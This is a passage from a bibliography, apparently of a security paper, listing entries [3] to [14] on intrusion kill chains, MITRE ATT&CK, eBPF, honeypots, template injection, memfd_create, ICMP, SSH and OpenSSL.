[3] E. M. Hutchins, M. J. Cloppert, and R. M. Amin, "Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains," in *Leading Issues in Information Warfare & Security Research*, vol. 1, no. 1, pp. 1-14, Lockheed Martin Corporation, 2011.

[4] B. Strom, A. Applebaum, D. Miller, K. Nickels, A. Pennington, and C. Thomas, "MITRE ATT&CK: Design and Philosophy," MITRE Corporation, 2020. Available: https://attack.mitre.org/docs/ATTACK_Design_and_Philosophy_March_2020.pdf

[5] M. Fleming, "A thorough introduction to eBPF," *LWN.net*, December 2017. Available: https://lwn.net/Articles/740157/

[6] Y. Song, "bpf: implement bpf_send_signal helper," Linux Kernel Commit, 2019. Available: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8b401f9ed244

[7] L. Spitzner, *Honeypots: Tracking Hackers*. Addison-Wesley Professional, 2003. ISBN: 0-321-10895-7.

[8] National Institute of Standards and Technology, "Recommendation for Block Cipher Modes of Operation," NIST Special Publication 800-38A, 2001. Available: https://csrc.nist.gov/publications/detail/sp/800-38a/final

[9] J. Kettle, "Server-Side Template Injection," PortSwigger Research, 2015. Available: https://portswigger.net/research/server-side-template-injection

[10] M. Kerrisk, "memfd_create(2) — Linux manual page," *The Linux man-pages project*, 2020. Available: https://man7.org/linux/man-pages/man2/memfd_create.2.html

[11] J. Postel, "Internet Control Message Protocol," RFC 792, Internet Engineering Task Force, September 1981. Available: https://www.rfc-editor.org/rfc/rfc792

[12] T. Ylonen and C. Lonvick, "The Secure Shell (SSH) Transport Layer Protocol," RFC 4253, Internet Engineering Task Force, January 2006. Available: https://www.rfc-editor.org/rfc/rfc4253

[13] The BCC Authors, "BPF Compiler Collection (BCC) — Tools for BPF-based Linux IO analysis, networking, monitoring, and more," 2015–present. Available: https://github.com/iovisor/bcc

[14] The OpenSSL Project, "OpenSSL: Cryptography and SSL/TLS Toolkit," 1998–present. Available: https://www.openssl.org
